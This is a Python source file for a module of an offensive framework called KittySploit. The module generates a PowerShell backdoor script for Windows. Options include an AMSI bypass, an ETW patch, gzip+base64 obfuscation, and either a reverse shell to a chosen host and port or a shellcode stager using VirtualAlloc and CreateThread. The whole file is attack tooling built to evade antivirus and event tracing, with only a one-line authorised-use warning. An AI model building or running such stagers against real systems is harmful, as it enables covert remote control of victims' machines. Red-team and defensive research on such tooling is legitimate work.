#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PowerShell stager with AMSI/ETW evasion prelude.

Generates a .ps1 script with optional in-process AMSI bypass, ETW patch,
gzip wrapper, and either a built-in reverse shell or shellcode stager mode.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import generate_payload_bytes, option_value, report_payload_size
from lib.compile.powershell_stager import build_powershell_stager


class Module(Backdoor):
    __info__ = {
        "name": "PowerShell Stager Evasion",
        "description": (
            "Writes a PowerShell backdoor with optional AMSI bypass and ETW patch. "
            "Supports reverse-shell mode or shellcode stager mode (VirtualAlloc + CreateThread)."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "session_type": SessionType.SHELL,
        "listener": "listeners/multi/reverse_tcp",
        "references": [
            "https://github.com/tihanyin/PSSW100AVB",
        ],
    }

    mode = OptChoice(
        "reverse_shell",
        "Stager mode",
        True,
        ["reverse_shell", "shellcode_stager"],
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address", True)
    lport = OptPort(4444, "Connect-back TCP port", True)
    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (shellcode_stager mode only)",
        False,
    )
    encoder = OptString("", "Encoder module path (shellcode_stager mode, optional)", False)
    bypass_amsi = OptBool(True, "Prepend AMSI init-failed bypass", False)
    patch_etw = OptBool(False, "Patch EtwEventWrite in-process before stager body", False)
    gzip_encode = OptBool(False, "Wrap final script in gzip+base64 one-liner", False)
    output_name = OptString("", "Output filename (.ps1); random if empty", False)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        mode = str(option_value(self, "mode") or "reverse_shell").lower()
        shellcode = None
        if mode == "shellcode_stager":
            shellcode = generate_payload_bytes(self)
            if not shellcode:
                return False
            report_payload_size(shellcode)

        try:
            script = build_powershell_stager(
                lhost=str(option_value(self, "lhost") or "127.0.0.1"),
                lport=int(option_value(self, "lport") or 4444),
                bypass_amsi=bool(option_value(self, "bypass_amsi")),
                patch_etw=bool(option_value(self, "patch_etw")),
                mode=mode,
                shellcode=shellcode,
                gzip_encode=bool(option_value(self, "gzip_encode")),
            )
        except Exception as exc:
            print_error(f"Failed to build PowerShell stager: {exc}")
            return False

        filename = str(option_value(self, "output_name") or "").strip()
        if not filename:
            filename = self.random_text(8) + "_stager.ps1"
        if not filename.lower().endswith(".ps1"):
            filename += ".ps1"

        self.write_out_dir(filename, script)
        print_success(f"Generated: {filename}")
        print_info(
            f"Mode: {mode} | AMSI bypass: {option_value(self, 'bypass_amsi')} | "
            f"ETW patch: {option_value(self, 'patch_etw')} | Gzip: {option_value(self, 'gzip_encode')}"
        )
        print_warning("Use only on authorized systems.")
        return True
